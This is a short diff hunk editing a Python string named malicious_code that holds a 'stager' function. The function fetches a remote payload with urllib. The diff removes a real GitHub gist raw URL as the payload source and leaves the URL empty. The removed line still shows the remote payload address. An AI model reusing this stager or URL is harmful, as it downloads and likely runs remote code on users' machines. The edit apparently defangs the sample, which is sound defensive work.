@@ -4,7 +4,7 @@ malicious_code = r"""
 import urllib.request
 
 def run_stager(): 
-    PAYLOAD_URL = "https://gist.githubusercontent.com/khanhpham-net/5780672f4d0f8a0342ab50258472674f/raw/d7817251c616d7bf9a00751a1ded0fcbb08545c3/gistfile1.txt"
+    PAYLOAD_URL = ""
     try:
         req = urllib.request.Request(PAYLOAD_URL)
         response = urllib.request.urlopen(req)
